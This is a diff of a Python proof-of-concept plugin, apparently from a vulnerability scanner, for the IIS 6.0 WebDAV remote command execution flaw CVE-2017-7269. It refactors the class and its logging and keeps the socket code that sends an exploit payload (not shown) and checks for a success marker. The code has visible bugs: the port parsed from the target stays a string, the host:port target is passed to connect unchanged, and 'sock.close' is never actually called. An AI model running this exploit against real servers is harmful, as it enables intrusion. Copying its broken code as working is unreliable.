@@ -3,23 +3,23 @@
 
 __author__ = 'xiaokong'
 
-import sys
 import socket
-from module.log import logger
+from module.plugin import Plugin
 
-description = 'Windows Server 2003 R2 IIS 6.0 remote command execute'
-querytype = 'site'
-type = 'FRAME'
+class poc(Plugin):
 
-class poc(object):
+    type = 'FRAME'
+    querytype = 'site'
+    description = 'Windows Server 2003 R2 IIS 6.0 remote command execute'
     
-    def __init__(self, v):
+    def __init__(self):
     
         self.port = 80
-        self.logger = logger(v)
     
     def exploit(self, target):
         
+        self.port = target.split(':')[1] if (':' in target) else 80 
+
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
             sock.connect((target,self.port))  
@@ -37,7 +37,7 @@ class poc(object):
             sock.send(pay)  
             data = sock.recv(80960)
             if 'HHIT CVE-2017-7269 Success' in data:
-                self.logger.log(41,str([target]))
+                self.log.vuln(target)
             sock.close
         except Exception as e:
-            self.logger.debug(target+' : '+str(e))
+            self.logger.error(target+' : '+str(e))
